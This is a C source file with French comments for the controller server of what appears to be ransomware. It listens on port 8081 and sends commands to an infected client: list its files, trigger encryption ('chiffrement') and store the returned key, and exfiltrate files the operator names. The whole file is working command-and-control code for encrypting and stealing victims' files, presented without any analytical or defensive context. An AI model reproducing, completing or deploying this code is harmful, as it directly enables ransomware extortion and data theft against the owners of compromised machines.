#include "common.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#define SERVER_PORT 8081
#define BUFFER_SIZE 1024
#define KEY_FILE "received_key.txt"

void handleClient(my_socket_t clientSocket) {
    char command[BUFFER_SIZE];
    char buffer[BUFFER_SIZE];

    while (1) {
        // Entrée de commande utilisateur
        printf("Entrez une commande à envoyer au client (list, chiffrement, exfiltration, exit) : ");
        if (scanf("%s", command) != 1) {
            printf("Erreur de lecture de la commande.\n");
            break;
        }

        // Envoi de la commande au client
        if (send(clientSocket, command, (int)strlen(command), 0) < 0) {
            perror("Erreur lors de l'envoi de la commande au client");
            break;
        }

        if (strcmp(command, "exit") == 0) {
            printf("Commande 'exit' envoyée. Fermeture...\n");
            break;
        }

        if (strcmp(command, "list") == 0) {
            printf("Récupération de la liste des fichiers...\n");
            while (1) {
                memset(buffer, 0, sizeof(buffer));
                int bytesReceived = recv(clientSocket, buffer, sizeof(buffer) - 1, 0);
                if (bytesReceived <= 0) {
                    printf("Erreur ou connexion fermée par le client.\n");
                    return;
                }

                buffer[bytesReceived] = '\0';
                if (strcmp(buffer, "END_OF_LIST\n") == 0) {
                    printf("Fin de la liste des fichiers.\n");
                    break;
                }
                printf("Fichier : %s", buffer);
            }
        }

        if (strcmp(command, "chiffrement") == 0) {
            printf("Commande 'chiffrement' envoyée. En attente de la clé...\n");
            memset(buffer, 0, sizeof(buffer));
            int bytesReceived = recv(clientSocket, buffer, sizeof(buffer) - 1, 0);
            if (bytesReceived <= 0) {
                printf("Erreur ou connexion fermée par le client.\n");
                return;
            }
            buffer[bytesReceived] = '\0';

            // Stockage de la clé reçue
            FILE *keyFile = fopen(KEY_FILE, "w");
            if (keyFile) {
                fprintf(keyFile, "%s\n", buffer);
                fclose(keyFile);
                printf("Clé de chiffrement reçue et sauvegardée dans '%s'.\n", KEY_FILE);
            } else {
                printf("Erreur : impossible de sauvegarder la clé.\n");
            }
        }

        if (strcmp(command, "exfiltration") == 0) {
            printf("Entrez le chemin du fichier à exfiltrer : ");
            char fileName[BUFFER_SIZE];
            if (scanf("%s", fileName) != 1) {
                printf("Erreur de lecture du nom de fichier.\n");
                continue;
            }

            // Envoi du nom de fichier au client
            if (send(clientSocket, fileName, (int)strlen(fileName), 0) < 0) {
                perror("Erreur lors de l'envoi du nom de fichier au client");
                continue;
            }

            printf("Nom du fichier demandé : %s\n", fileName);
            printf("Réception du fichier en cours...\n");

            FILE *outFile = fopen(fileName, "wb");
            if (!outFile) {
                printf("Erreur : impossible de créer le fichier '%s'.\n", fileName);
                continue;
            }

            while (1) {
                memset(buffer, 0, sizeof(buffer));
                int bytesReceived = recv(clientSocket, buffer, sizeof(buffer) - 1, 0);
                if (bytesReceived <= 0) {
                    printf("Erreur ou connexion fermée par le client.\n");
                    fclose(outFile);
                    return;
                }

                buffer[bytesReceived] = '\0';
                if (strcmp(buffer, "END_OF_FILE") == 0) {
                    printf("Fichier '%s' reçu avec succès.\n", fileName);
                    break;
                }

                fwrite(buffer, 1, bytesReceived, outFile);
            }
            fclose(outFile);
        }
    }
}

int main() {
    my_socket_t serverSocket, clientSocket;
    struct sockaddr_in serverAddr, clientAddr;

#ifdef _WIN32
    WSADATA wsa;
    if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0) {
        printf("Échec de l'initialisation de Winsock. Code d'erreur : %d\n", WSAGetLastError());
        return 1;
    }
#endif

    serverSocket = socket(AF_INET, SOCK_STREAM, 0);
    if (serverSocket == INVALID_SOCKET_VALUE) {
        perror("Erreur lors de la création du socket");
        return 1;
    }

    serverAddr.sin_family = AF_INET;
    serverAddr.sin_addr.s_addr = INADDR_ANY;
    serverAddr.sin_port = htons(SERVER_PORT);

    if (bind(serverSocket, (struct sockaddr *)&serverAddr, sizeof(serverAddr)) < 0) {
        perror("Erreur lors du bind");
        closesocket(serverSocket);
        return 1;
    }

    if (listen(serverSocket, 3) < 0) {
        perror("Erreur lors de l'écoute");
        closesocket(serverSocket);
        return 1;
    }

    printf("En écoute sur le port %d...\n", SERVER_PORT);

    socklen_t clientAddrLen = sizeof(clientAddr);
    clientSocket = accept(serverSocket, (struct sockaddr *)&clientAddr, &clientAddrLen);
    if (clientSocket == INVALID_SOCKET_VALUE) {
        perror("Erreur lors de l'acceptation de la connexion");
        closesocket(serverSocket);
        return 1;
    }

    printf("Client connecté avec succès.\n");
    handleClient(clientSocket);

    closesocket(clientSocket);
    closesocket(serverSocket);

#ifdef _WIN32
    WSACleanup();
#endif

    return 0;
}
